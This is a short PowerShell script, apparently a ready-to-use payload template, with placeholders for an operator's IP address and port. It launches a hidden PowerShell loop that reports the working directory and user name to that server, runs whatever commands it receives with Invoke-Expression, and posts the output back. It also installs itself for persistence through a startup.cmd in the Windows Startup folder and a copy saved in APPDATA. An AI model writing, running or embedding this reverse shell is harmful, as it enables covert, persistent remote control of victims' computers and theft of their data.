Start-Process $PSHOME\powershell.exe -ArgumentList {$p='http://';$l='#IP_ADDRESS:#PORT';$i=(Invoke-WebRequest -UseBasicParsing -Uri "${p}${l}/" -Headers @{'x-Dir'=($pwd.Path); 'x-User'=(whoami)}).Content;while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri "${p}${l}/${i}" -Headers @{'x-Dir'=($pwd.Path); 'x-User'=(whoami)}).Content;if ($c -ne ''){$r=Invoke-Expression $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$r=Invoke-WebRequest -UseBasicParsing -Uri "${p}${l}/${i}" -Headers @{'x-Dir'=($pwd.Path); 'x-User'=(whoami)} -Method Post -Body ($e+$r)}sleep 0.8}} -WindowStyle Hidden
Write-Output "PowerShell -Command `"Get-Content `"`$env:APPDATA\startup.ps1`" | Foreach-Object {Invoke-Expression `$_}; exit`"" | Out-File -FilePath "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\startup.cmd" -Encoding ASCII
Write-Output 'Start-Process $PSHOME\powershell.exe -ArgumentList {$p=''http://'';$l=''#IP_ADDRESS:#PORT'';$i=(Invoke-WebRequest -UseBasicParsing -Uri "${p}${l}/" -Headers @{''x-Dir''=($pwd.Path); ''x-User''=(whoami)}).Content;while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri "${p}${l}/${i}" -Headers @{''x-Dir''=($pwd.Path); ''x-User''=(whoami)}).Content;if ($c -ne ''''){$r=Invoke-Expression $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$r=Invoke-WebRequest -UseBasicParsing -Uri "${p}${l}/${i}" -Headers @{''x-Dir''=($pwd.Path); ''x-User''=(whoami)} -Method Post -Body ($e+$r)}sleep 0.8}} -WindowStyle Hidden' | Out-File -FilePath "$env:APPDATA\startup.ps1"